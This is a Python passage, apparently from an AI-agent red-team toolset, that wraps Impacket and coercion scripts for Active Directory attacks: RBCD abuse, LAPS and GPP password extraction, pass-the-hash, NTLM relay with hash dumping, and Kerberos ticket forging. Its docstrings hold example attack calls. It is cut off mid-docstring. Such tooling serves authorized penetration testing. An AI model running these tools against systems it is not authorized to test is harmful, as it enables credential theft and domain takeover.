import asyncio
import contextlib
import os
import re
import signal
import shutil
import sys
from pathlib import Path

from dreadnode import Config
from dreadnode.agents.tools import Toolset, tool_method
from dreadnode.tools.execute import execute

from loguru import logger


def _is_python_script(path: Path) -> bool:
    """Check if a file is a real Python script (not a shell wrapper or binary)."""
    try:
        with open(path, "rb") as f:
            first_line = f.readline(256)
        # Binary files (ELF, etc.) are not Python
        if b"\x00" in first_line:
            return False
        # Shell wrappers start with #!/bin/bash or #!/bin/sh
        if first_line.startswith(b"#!") and (
            b"/bin/bash" in first_line
            or b"/bin/sh" in first_line
            or b"/usr/bin/env bash" in first_line
            or b"/usr/bin/env sh" in first_line
        ):
            return False
        return True
    except OSError:
        return False


def _extract_real_path_from_wrapper(wrapper_path: Path) -> Path | None:
    """
    Extract the real script directory from a shell wrapper.

    These wrappers typically contain:
        exec python3 /real/path/to/script.py "$@"

    Returns the parent directory of the real script, or None.
    """
    try:
        content = wrapper_path.read_text()
    except (OSError, UnicodeDecodeError):
        return None

    # Match: exec python[3] /path/to/script.py "$@"
    # or:   exec /path/to/python /path/to/script.py "$@"
    match = re.search(r"exec\s+\S*python\S*\s+(\S+\.py)", content)
    if match:
        real_path = Path(match.group(1).strip("'\""))
        if real_path.is_file():
            return real_path.parent

    return None


def _ensure_impacket_installed() -> None:
    """Install impacket into the running Python if it's not importable.

    The runtime may not process ``dependencies.python`` from
    ``capability.yaml``, so we do a best-effort pip install at import
    time as a fallback.

    Set ``DREADNODE_SKIP_AUTO_INSTALL=1`` to disable (useful in tests/CI).
    """
    if os.environ.get("DREADNODE_SKIP_AUTO_INSTALL", "").strip() in ("1", "true", "yes"):
        return

    try:
        import impacket as _  # noqa: F401
    except ImportError:
        import subprocess

        logger.warning("impacket not importable — attempting pip install")
        for extra_args in ([], ["--break-system-packages"]):
            try:
                subprocess.run(
                    [
                        sys.executable,
                        "-m",
                        "pip",
                        "install",
                        "--quiet",
                        "impacket>=0.12.0",
                        *extra_args,
                    ],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    check=True,
                    timeout=120,
                )
                logger.info("impacket installed successfully")
                return
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired, OSError):
                continue
        logger.error("Failed to install impacket — impacket tools will not work")


_ensure_impacket_installed()


def _get_impacket_script_path() -> Path:
    """
    Auto-discover the impacket scripts directory.

    Returns a directory containing real Python impacket scripts (not
    shell wrappers) so they can be invoked via sys.executable.

    Tries multiple common locations, preferring site-packages (which
    matches sys.executable) over PATH (which may contain pip entry
    point wrappers installed for a different Python version):
    1. pip-installed: site-packages/impacket/examples/ (same Python as sys.executable)
    2. apt-installed: /usr/share/doc/python3-impacket/examples/
    3. Global PATH: resolve the found script's directory, following
       shell wrappers to the real scripts if needed
    """
    # Prefer site-packages — these scripts are guaranteed to work with
    # sys.executable since they live in the same Python installation.
    # PATH entries (e.g. ~/.local/bin/) are pip entry point wrappers
    # that may be installed for a different Python version.
    try:
        import impacket

        impacket_pkg_path = Path(impacket.__file__).parent
        examples_path = impacket_pkg_path / "examples"
        if examples_path.exists() and (examples_path / "secretsdump.py").exists():
            return examples_path
    except ImportError:
        pass

    # Fall back to apt installation path
    apt_path = Path("/usr/share/doc/python3-impacket/examples/")
    if apt_path.exists() and (apt_path / "secretsdump.py").exists():
        return apt_path

    # Last resort: check PATH (pipx / manual install)
    found = shutil.which("secretsdump.py")
    if found is not None:
        found_path = Path(found).resolve()
        if _is_python_script(found_path):
            return found_path.parent

        # PATH entry is a shell wrapper — try to extract the real
        # script path (e.g. "exec python3 /real/path/script.py")
        real_dir = _extract_real_path_from_wrapper(found_path)
        if real_dir is not None:
            logger.debug(
                f"Impacket wrapper at {found_path} points to real scripts at {real_dir}"
            )
            return real_dir

        logger.warning(
            f"Impacket script at {found_path} is a shell wrapper, skipping PATH discovery"
        )

    # Default fallback
    return Path("/usr/share/doc/python3-impacket/examples/")


g_default_impacket_path = _get_impacket_script_path()

# Coercion script paths for combined relay+coerce tool
_COERCION_SCRIPTS: dict[str, tuple[Path, str, str]] = {
    "petitpotam": (
        Path("/opt/PetitPotam/"),
        "PetitPotam.py",
        "https://github.com/topotam/PetitPotam",
    ),
    "dfscoerce": (
        Path("/opt/DFSCoerce/"),
        "dfscoerce.py",
        "https://github.com/Wh04m1001/DFSCoerce",
    ),
    "shadowcoerce": (
        Path("/opt/ShadowCoerce/"),
        "shadowcoerce.py",
        "https://github.com/ShutdownRepo/ShadowCoerce",
    ),
}

# Patterns in ntlmrelayx stdout that indicate a successful relay
_RELAY_SUCCESS_PATTERNS = [
    "certificate",
    "got certificate",
    "dumping",
    "sam hashes",
    "authenticating against",
    "relay succeeded",
    "shadow credentials",
    "msds-keycredentiallink",
    "escalating",
    "adding computer",
    "laps password",
    "gmsa password",
]

# How long to wait after SIGTERM before escalating to SIGKILL.
_SIGKILL_TIMEOUT = 5.0


async def _wait_for_relay_ready(
    proc: asyncio.subprocess.Process,
    output_buffer: list[str],
    timeout: float = 30,
) -> bool:
    """Read ntlmrelayx stdout until 'Servers started' appears or timeout.

    Returns True if the relay is ready, False on early exit or timeout.
    """
    assert proc.stdout is not None
    loop = asyncio.get_running_loop()
    deadline = loop.time() + timeout

    while loop.time() < deadline:
        remaining = deadline - loop.time()
        try:
            line = await asyncio.wait_for(
                proc.stdout.readline(), timeout=min(remaining, 5)
            )
        except TimeoutError:
            if proc.returncode is not None:
                return False
            continue

        if not line:
            return False  # EOF — process exited

        decoded = line.decode(errors="replace")
        output_buffer.append(decoded)

        if "servers started" in decoded.lower():
            return True

        # Early failure: port bind error
        lower = decoded.lower()
        if "error" in lower and ("bind" in lower or "address already in use" in lower):
            return False

    return False


async def _wait_for_relay_result(
    proc: asyncio.subprocess.Process,
    output_buffer: list[str],
    timeout: float = 90,
) -> bool:
    """Read ntlmrelayx stdout looking for success indicators.

    On match, continues reading for 5 more seconds to capture follow-up
    data (certificate values, hashes, etc.) before returning.
    """
    assert proc.stdout is not None
    loop = asyncio.get_running_loop()
    deadline = loop.time() + timeout

    while loop.time() < deadline:
        remaining = deadline - loop.time()
        try:
            line = await asyncio.wait_for(
                proc.stdout.readline(), timeout=min(remaining, 5)
            )
        except TimeoutError:
            if proc.returncode is not None:
                break
            continue

        if not line:
            break

        decoded = line.decode(errors="replace")
        output_buffer.append(decoded)

        lower = decoded.lower()
        if any(pattern in lower for pattern in _RELAY_SUCCESS_PATTERNS):
            # Drain follow-up output (cert data, hash values) for up to 5s total
            drain_deadline = loop.time() + 5
            try:
                while loop.time() < drain_deadline:
                    drain_remaining = drain_deadline - loop.time()
                    extra = await asyncio.wait_for(
                        proc.stdout.readline(), timeout=drain_remaining
                    )
                    if not extra:
                        break
                    output_buffer.append(extra.decode(errors="replace"))
            except TimeoutError:
                pass
            return True

    return False


async def _kill_relay(proc: asyncio.subprocess.Process) -> None:
    """Terminate a relay subprocess and its process group.

    Sends SIGTERM to the process group, waits up to 5 seconds, then
    escalates to SIGKILL.  Requires the subprocess was created with
    ``start_new_session=True``.
    """
    if proc.returncode is not None:
        return

    pid = proc.pid
    if pid is None:
        return

    try:
        pgid = os.getpgid(pid)
    except (OSError, ProcessLookupError):
        return

    with contextlib.suppress(OSError, ProcessLookupError):
        os.killpg(pgid, signal.SIGTERM)

    try:
        await asyncio.wait_for(proc.wait(), timeout=_SIGKILL_TIMEOUT)
    except TimeoutError:
        with contextlib.suppress(OSError, ProcessLookupError):
            os.killpg(pgid, signal.SIGKILL)
        with contextlib.suppress(ProcessLookupError):
            await proc.wait()


class Impacket(Toolset):
    """
    Toolset for network operations using Impacket utilities.
    """

    timeout: int = Config(default=30)
    """Default timeout for commands in seconds."""
    script_path: Path = Config(default=g_default_impacket_path)
    """Directory containing the impacket scripts."""

    def _build_script_command(self, script_name: str, args: list[str]) -> list[str]:
        """
        Build command list for an impacket script.

        Always invokes scripts via sys.executable to bypass potentially
        broken shebangs in wrapper scripts.

        Args:
            script_name: Name of the script (e.g., "secretsdump.py")
            args: Arguments to pass to the script

        Returns:
            Complete command list ready for execution
        """
        script = self.script_path / script_name
        if not script.is_file():
            raise FileNotFoundError(
                f"Impacket script '{script_name}' not found at '{self.script_path}'. "
                f"Check your impacket installation."
            )
        return [sys.executable, str(script), *args]

    def _build_basic_identity(
        self,
        *,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
    ) -> str | None:
        """
        Build basic identity: domain/username[:password]

        Used by: rbcd, dacledit, owneredit, get_st

        Args:
            domain: Domain name
            username: Username
            password: Password (optional)

        Returns:
            Identity string or None if neither username nor domain provided
        """
        # Normalize empty strings to None
        domain = domain or None
        username = username or None
        password = password or None

        if not domain and not username:
            return None

        parts = []
        if domain:
            parts.append(domain)
        if username:
            if domain:
                parts.append("/")
            parts.append(username)
            if password:
                parts.append(f":{password}")

        return "".join(parts) if parts else None

    def _build_identity_with_target(
        self,
        target: str,
        *,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
    ) -> str:
        """
        Build identity with target: [[domain/]username[:password]@]target

        Used by: secretsdump, get_gpp_password, changepasswd, lookup_sid

        Args:
            target: Target hostname/IP or "LOCAL"
            domain: Domain name (optional)
            username: Username (optional)
            password: Password (optional)

        Returns:
            Identity string with target appended
        """
        # Normalize empty strings to None (handled by _build_basic_identity)
        if target == "LOCAL":
            return "LOCAL"

        identity = self._build_basic_identity(
            domain=domain, username=username, password=password
        )
        if identity:
            return f"{identity}@{target}"
        return target

    def _build_domain_first_identity(
        self,
        domain: str,
        *,
        username: str | None = None,
        password: str | None = None,
    ) -> str:
        """
        Build domain-first identity: domain[/username[:password]]

        Used by: find_delegation, get_laps_password, get_user_spns, get_np_users

        Args:
            domain: Domain name (required)
            username: Username (optional)
            password: Password (optional)

        Returns:
            Domain-first identity string
        """
        # Normalize empty strings to None
        username = username or None
        password = password or None

        if not username:
            # Return domain with trailing slash for unauthenticated queries
            # This format (domain/) is required by impacket tools like GetNPUsers.py
            return f"{domain}/"

        result = f"{domain}/{username}"
        if password:
            result += f":{password}"
        return result

    def _build_auth_flags(
        self,
        *,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        password: str | None = None,
    ) -> list[str]:
        """
        Build authentication method flags.

        Automatically adds -no-pass when no password/hash is provided.

        Args:
            hashes: NTLM hashes in LMHASH:NTHASH format
            kerberos: Use Kerberos authentication (-k)
            aes_key: AES key for Kerberos
            password: Password (used to determine if -no-pass is needed)

        Returns:
            List of authentication flags
        """
        # Normalize empty strings to None
        hashes = hashes or None
        aes_key = aes_key or None
        password = password or None

        flags = []

        if hashes:
            flags.extend(["-hashes", hashes])

        if kerberos:
            flags.append("-k")

        if aes_key:
            flags.extend(["-aesKey", aes_key])

        # Auto-add -no-pass when no password/hash provided
        # This prevents impacket from prompting for password interactively
        if not hashes and not password:
            flags.append("-no-pass")

        return flags

    def _build_connection_flags(
        self,
        *,
        dc_ip: str | None = None,
        dc_host: str | None = None,
        target_ip: str | None = None,
    ) -> list[str]:
        """
        Build connection/network override flags.

        Args:
            dc_ip: Domain controller IP address override
            dc_host: Domain controller hostname override
            target_ip: Target machine IP address override

        Returns:
            List of connection flags
        """
        flags = []

        if dc_ip:
            flags.extend(["-dc-ip", dc_ip])

        if dc_host:
            flags.extend(["-dc-host", dc_host])

        if target_ip:
            flags.extend(["-target-ip", target_ip])

        return flags

    def _build_ntlmrelayx_args(
        self,
        *,
        target: str | None = None,
        targets_file: str | None = None,
        smb2support: bool = False,
        socks: bool = False,
        interface_ip: str | None = None,
        smb_port: int | None = None,
        http_port: str | None = None,
        exec_command: str | None = None,
        interactive: bool = False,
        lootdir: str | None = None,
        output_file: str | None = None,
        dump_hashes: bool = False,
        escalate_user: str | None = None,
        delegate_access: bool = False,
        dump_laps: bool = False,
        dump_gmsa: bool = False,
        dump_adcs: bool = False,
        add_computer: str | None = None,
        no_dump: bool = False,
        no_da: bool = False,
        no_acl: bool = False,
        adcs: bool = False,
        template: str | None = None,
        altname: str | None = None,
        shadow_credentials: bool = False,
        shadow_target: str | None = None,
        remove_mic: bool = False,
        no_smb_server: bool = False,
        no_http_server: bool = False,
        no_wcf_server: bool = False,
        no_raw_server: bool = False,
    ) -> list[str]:
        """Build the argument list for ntlmrelayx.py.

        Shared by :meth:`impacket_ntlmrelayx` (standalone) and
        :meth:`impacket_ntlmrelay_attack` (combined relay+coerce).
        """
        args: list[str] = []

        if target:
            args.extend(["-t", target])
        if targets_file:
            args.extend(["-tf", targets_file])
        if smb2support:
            args.append("-smb2support")
        if socks:
            args.append("-socks")
        if interface_ip:
            args.extend(["-ip", interface_ip])
        if smb_port is not None:
            args.extend(["--smb-port", str(smb_port)])
        if http_port:
            args.extend(["--http-port", http_port])
        if exec_command:
            args.extend(["-c", exec_command])
        if interactive:
            args.append("-i")
        if lootdir:
            args.extend(["-l", lootdir])
        if output_file:
            args.extend(["-of", output_file])
        if dump_hashes:
            args.append("-dh")

        # LDAP options
        if escalate_user:
            args.extend(["--escalate-user", escalate_user])
        if delegate_access:
            args.append("--delegate-access")
        if dump_laps:
            args.append("--dump-laps")
        if dump_gmsa:
            args.append("--dump-gmsa")
        if dump_adcs:
            args.append("--dump-adcs")
        if no_dump:
            args.append("--no-dump")
        if no_da:
            args.append("--no-da")
        if no_acl:
            args.append("--no-acl")

        # AD CS options
        if adcs:
            args.append("--adcs")
        if template:
            args.extend(["--template", template])
        if altname:
            args.extend(["--altname", altname])

        # Shadow Credentials options
        if shadow_credentials:
            args.append("--shadow-credentials")
        if shadow_target:
            args.extend(["--shadow-target", shadow_target])

        # Exploit options
        if remove_mic:
            args.append("--remove-mic")

        # Server disable options
        if no_smb_server:
            args.append("--no-smb-server")
        if no_http_server:
            args.append("--no-http-server")
        if no_wcf_server:
            args.append("--no-wcf-server")
        if no_raw_server:
            args.append("--no-raw-server")

        if add_computer:
            args.extend(["--add-computer", add_computer])

        return args

    def _build_coercion_command(
        self,
        method: str,
        listener: str,
        target: str,
        *,
        username: str | None = None,
        password: str | None = None,
        domain: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        dc_ip: str | None = None,
        pipe: str | None = None,
    ) -> list[str]:
        """Build the command list for a coercion script.

        Args:
            method: Coercion method (petitpotam, dfscoerce, shadowcoerce).
            listener: IP address the relay server is listening on.
            target: Machine to coerce authentication from.
            username: Username for authentication to the target.
            password: Password for authentication.
            domain: Domain name.
            hashes: NTLM hashes for authentication.
            kerberos: Use Kerberos authentication (petitpotam/dfscoerce only).
            dc_ip: Domain controller IP (petitpotam/dfscoerce only).
            pipe: Named pipe to use (petitpotam only).

        Returns:
            Complete command list ready for execution.

        Raises:
            ValueError: If method is not recognized.
            FileNotFoundError: If the coercion script is not installed.
        """
        if method not in _COERCION_SCRIPTS:
            raise ValueError(
                f"Unknown coercion method '{method}'. "
                f"Choose from: {', '.join(_COERCION_SCRIPTS)}"
            )

        base_path, script_name, repo_url = _COERCION_SCRIPTS[method]
        script = base_path / script_name
        if not script.is_file():
            raise FileNotFoundError(
                f"Coercion script '{script_name}' not found at '{base_path}'. "
                f"Install via: git clone {repo_url} {base_path}"
            )

        args: list[str] = []
        if username:
            args.extend(["-u", username])
        if hashes:
            args.extend(["-hashes", hashes])
        elif password:
            args.extend(["-p", password])
        if domain:
            args.extend(["-d", domain])

        # Auto -no-pass when no creds provided (prevents interactive prompt)
        if not password and not hashes:
            args.append("-no-pass")

        # petitpotam/dfscoerce support -k and -dc-ip; shadowcoerce does not
        if method != "shadowcoerce":
            if kerberos:
                args.append("-k")
            if dc_ip:
                args.extend(["-dc-ip", dc_ip])

        # -pipe is petitpotam-only
        if pipe and method == "petitpotam":
            args.extend(["-pipe", pipe])

        args.extend([listener, target])
        return [sys.executable, str(script), *args]

    @tool_method(catch=True)
    async def impacket_rbcd(
        self,
        *,
        delegate_to: str,
        action: str,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        delegate_from: str | None = None,
        use_ldaps: bool = False,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket rbcd.py to configure Resource-Based Constrained Delegation.

        This tool modifies the msDS-AllowedToActOnBehalfOfOtherIdentity property for RBCD attacks.

        Authentication:
            At least one of (password, hashes, kerberos) must be provided.
            Domain and username are required unless using Kerberos with KRB5CCNAME.

        Usage Examples:
            # Read current RBCD configuration for a target
            await impacket_rbcd(
                delegate_to="TARGET$",
                action="read",
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Write RBCD entry to allow ATTACKER$ to impersonate to TARGET$
            await impacket_rbcd(
                delegate_to="TARGET$",
                action="write",
                delegate_from="ATTACKER$",
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Remove RBCD entry using NTLM hash
            await impacket_rbcd(
                delegate_to="TARGET$",
                action="flush",
                domain="corp.local",
                username="user",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0"
            )

        <documentation>
        Python (re)setter for property msDS-AllowedToActOnBehalfOfOtherIdentity for Kerberos RBCD attacks.

        positional arguments:
        identity              domain.local/username[:password]

        options:
        -h, --help            show this help message and exit
        -delegate-to DELEGATE_TO
                                Target account the DACL is to be read/edited/etc.
        -delegate-from DELEGATE_FROM
                                Attacker controlled account to write on the rbcd property of -delegate-to (only when using `-action write`)
        -action [{read,write,remove,flush}]
                                Action to operate on msDS-AllowedToActOnBehalfOfOtherIdentity
        -use-ldaps            Use LDAPS instead of LDAP
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

        connection:
        -dc-ip ip address     IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part
                                (FQDN) specified in the identity parameter
        </documentation>

        Args:
            delegate_to: Target account for RBCD configuration (required).
            action: Action to perform - 'read', 'write', 'remove', or 'flush' (required).
            domain: Domain name (e.g., 'corp.local').
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            delegate_from: Attacker account to write (required when action='write').
            use_ldaps: Use LDAPS instead of LDAP.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Validation
        if action == "write" and not delegate_from:
            raise ValueError("delegate_from is required when action='write'")

        if not (password or hashes or kerberos):
            raise ValueError(
                "Must provide at least one authentication method: password, hashes, or kerberos"
            )

        # Build identity
        identity = self._build_basic_identity(
            domain=domain, username=username, password=password
        )
        if not identity and not kerberos:
            raise ValueError(
                "Must provide domain/username unless using Kerberos authentication"
            )

        # Build command
        args = []
        if identity:
            args.append(identity)

        args.extend(["-delegate-to", delegate_to])
        args.extend(["-action", action])

        if delegate_from:
            args.extend(["-delegate-from", delegate_from])

        if use_ldaps:
            args.append("-use-ldaps")

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip))

        return await execute(
            self._build_script_command("rbcd.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_get_gpp_password(
        self,
        target: str,
        *,
        domain: str | None = None,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        target_ip: str | None = None,
        xmlfile: str | None = None,
        share: str | None = None,
        base_dir: str | None = None,
        port: int | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket Get-GPPPassword.py to find and decrypt GPP passwords.

        Searches for Group Policy Preferences passwords in SYSVOL or parses local XML files.

        Usage Examples:
            # Search for GPP passwords in SYSVOL
            await impacket_get_gpp_password(
                target="dc01.corp.local",
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Search specific share with NTLM hash
            await impacket_get_gpp_password(
                target="dc01.corp.local",
                domain="corp.local",
                username="user",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                share="SYSVOL"
            )

            # Parse local XML file
            await impacket_get_gpp_password(
                target="LOCAL",
                xmlfile="/path/to/Groups.xml"
            )

        <documentation>
        Group Policy Preferences passwords finder and decryptor.

        positional arguments:
        target                [[domain/]username[:password]@]<targetName or address> or LOCAL (if you want to parse local files)

        options:
        -h, --help            show this help message and exit
        -xmlfile XMLFILE      Group Policy Preferences XML files to parse
        -share SHARE          SMB Share
        -base-dir BASE_DIR    Directory to search in (Default: /)
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              Don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

        connection:
        -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
        -target-ip ip address
                                IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the
                                NetBIOS name and you cannot resolve it
        -port [destination port]
                                Destination port to connect to SMB Server
        </documentation>

        Args:
            target: Target hostname/IP or "LOCAL" for local file parsing (required).
            domain: Domain name.
            username: Username for authentication.
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            target_ip: Target machine IP address override.
            xmlfile: Local XML file to parse (for LOCAL mode).
            share: SMB share name to search.
            base_dir: Directory to search in (default: /).
            port: Destination port to connect to SMB server.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Build identity with target
        identity = self._build_identity_with_target(
            target, domain=domain, username=username, password=password
        )

        # Build command
        args = [identity]

        if xmlfile:
            args.extend(["-xmlfile", xmlfile])

        if share:
            args.extend(["-share", share])

        if base_dir:
            args.extend(["-base-dir", base_dir])

        if port is not None:
            args.extend(["-port", str(port)])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, target_ip=target_ip))

        return await execute(
            self._build_script_command("Get-GPPPassword.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_find_delegation(
        self,
        *,
        domain: str,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        dc_host: str | None = None,
        target_domain: str | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket findDelegation.py to query for delegation relationships.

        Searches for constrained and unconstrained delegation configurations in Active Directory.

        Usage Examples:
            # Find all delegation relationships with password
            await impacket_find_delegation(
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Find delegation with NTLM hash and DC specified
            await impacket_find_delegation(
                domain="corp.local",
                username="user",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                dc_ip="10.0.0.1"
            )

            # Query across trust using Kerberos
            await impacket_find_delegation(
                domain="corp.local",
                username="user",
                kerberos=True,
                target_domain="external.local",
                env={"KRB5CCNAME": "/tmp/user.ccache"}
            )

        <documentation>
        Queries target domain for delegation relationships

        positional arguments:
        target                domain[/username[:password]]

        options:
        -h, --help            show this help message and exit
        -target-domain TARGET_DOMAIN
                                Domain to query/request if different than the domain of the user. Allows for retrieving delegation info across trusts.
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

        connection:
        -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter. Ignoredif
                                -target-domain is specified.
        -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
        </documentation>

        Args:
            domain: Domain name (required).
            username: Username for authentication (optional for anonymous queries).
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            dc_host: Domain controller hostname override.
            target_domain: Query different domain (for cross-trust queries).
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Build domain-first identity
        identity = self._build_domain_first_identity(
            domain, username=username, password=password
        )

        # Build command
        args = [identity]

        if target_domain:
            args.extend(["-target-domain", target_domain])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, dc_host=dc_host))

        return await execute(
            self._build_script_command("findDelegation.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_get_laps_password(
        self,
        *,
        domain: str,
        username: str | None = None,
        password: str | None = None,
        hashes: str | None = None,
        kerberos: bool = False,
        aes_key: str | None = None,
        dc_ip: str | None = None,
        dc_host: str | None = None,
        computer: str | None = None,
        outputfile: str | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket GetLAPSPassword.py to extract LAPS passwords from LDAP.

        Retrieves Local Administrator Password Solution (LAPS) passwords for computer accounts.

        Usage Examples:
            # Dump all LAPS passwords with password authentication
            await impacket_get_laps_password(
                domain="corp.local",
                username="user",
                password="Password123"
            )

            # Get LAPS password for specific computer
            await impacket_get_laps_password(
                domain="corp.local",
                username="user",
                password="Password123",
                computer="WS01"
            )

            # Dump LAPS using hash and save to file
            await impacket_get_laps_password(
                domain="corp.local",
                username="user",
                hashes=":31d6cfe0d16ae931b73c59d7e0c089c0",
                outputfile="laps_passwords.txt"
            )

        <documentation>
        Extract LAPS passwords from LDAP

        positional arguments:
        target                domain[/username[:password]]

        options:
        -h, --help            show this help message and exit
        -computer computername
                                Target a specific computer by its name
        -ts                   Adds timestamp to every logging output
        -debug                Turn DEBUG output ON
        -outputfile, -o OUTPUTFILE
                                Outputs to a file.

        authentication:
        -hashes LMHASH:NTHASH
                                NTLM hashes, format is LMHASH:NTHASH
        -no-pass              don't ask for password (useful for -k)
        -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CcnAME) based on target parameters. If valid credentials
                                cannot be found, it will use the ones specified in the command line
        -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

        connection:
        -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
        -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
        </documentation>

        Args:
            domain: Domain name (required).
            username: Username for authentication (optional for anonymous queries).
            password: Password for authentication.
            hashes: NTLM hashes in LMHASH:NTHASH format for pass-the-hash.
            kerberos: Use Kerberos authentication (requires KRB5CCNAME environment variable).
            aes_key: AES key for Kerberos authentication (128 or 256 bits).
            dc_ip: Domain controller IP address override.
            dc_host: Domain controller hostname override.
            computer: Target specific computer by name.
            outputfile: Output filename to save results.
            env: Optional environment variables (e.g., KRB5CCNAME for Kerberos).
            input: Optional input string to pass to the command's stdin.
        """
        # Build domain-first identity
        identity = self._build_domain_first_identity(
            domain, username=username, password=password
        )

        # Build command
        args = [identity]

        if computer:
            args.extend(["-computer", computer])

        if outputfile:
            args.extend(["-outputfile", outputfile])

        args.extend(
            self._build_auth_flags(
                hashes=hashes, kerberos=kerberos, aes_key=aes_key, password=password
            )
        )
        args.extend(self._build_connection_flags(dc_ip=dc_ip, dc_host=dc_host))

        return await execute(
            self._build_script_command("GetLAPSPassword.py", args),
            timeout=self.timeout,
            input=input,
            env=env,
        )

    @tool_method(catch=True)
    async def impacket_ticketer(
        self,
        target_user: str,
        *,
        domain: str,
        domain_sid: str,
        nthash: str | None = None,
        aes_key: str | None = None,
        keytab: str | None = None,
        spn: str | None = None,
        groups: str | None = None,
        user_id: int | None = None,
        extra_sid: str | None = None,
        extra_pac: bool = False,
        old_pac: bool = False,
        duration: int | None = None,
        impersonate: str | None = None,
        request: bool = False,
        request_user: str | None = None,
        request_password: str | None = None,
        request_hashes: str | None = None,
        dc_ip: str | None = None,
        env: dict[str, str] | None = None,
        input: str | None = None,
    ) -> str:
        r"""
        Execute impacket ticketer.py to create Kerberos golden/silver tickets.

        Creates forged Kerberos tickets using signing keys (NTLM hash or AES key).
        Note: This tool does NOT use standard authentication; it requires signing keys.

        Usage Examples:
            # Create golden ticket using NTLM hash
            await impacket_ticketer(
                target_user="Administrator",
                domain="corp.local",
                domain_sid="S-1-5-21-123456789-123456789-123456789",
